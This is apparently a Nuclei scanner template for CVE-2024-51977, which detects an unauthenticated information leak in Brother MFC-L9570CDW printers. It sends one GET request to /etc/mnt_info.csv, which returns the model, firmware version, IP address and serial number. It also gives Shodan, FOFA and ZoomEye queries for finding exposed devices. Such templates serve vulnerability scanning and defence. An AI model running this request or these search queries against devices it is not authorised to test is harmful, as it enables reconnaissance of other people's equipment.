id: CVE-2024-51977

info:
  name: Brother MFC-L9570CDW - Information Disclosure
  author: DhiyaneshDK,iamnoooob,darses
  severity: medium
  description: |
    An unauthenticated attacker who can access either the HTTP service (TCP port 80), the HTTPS service (TCP port 443), or the IPP service (TCP port 631), can leak several pieces of sensitive information from a vulnerable device. The URI path /etc/mnt_info.csv can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the deviceâ€™s model, firmware version, IP address, and serial number.
  impact: |
    Attackers can exploit this vulnerability to compromise system security.
  remediation: |
    Apply security patches to address CVE-2024-51977.
  reference:
    - https://github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb
  classification:
    epss-score: 0.39511
    epss-percentile: 0.97189
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"MFC-L9570CDW"
    fofa-query:
      - app="brother-Printer"
    zoomeye-query:
      - device="brother-Printer" || app="brother-Printer"
  tags: cve,cve2024,brother,mfc,printer,exposure,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/etc/mnt_info.csv"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"Model Name"'
          - '"IP Address"'
        condition: and

      - type: dsl
        dsl:
          - "status_code == 200"
          - 'contains(content_type, "text/comma-separated-values")'
        condition: and
# digest: 490a0046304402201ea6fc06b934206f7b1822d54dc910d29e02d04e2de9f86c81bde8759165db09022052e7c98707d82904a50c050a078ba032dc06d16626bc5bdba6420ab509af48ce:922c64590222798bb761d5b6d8e72950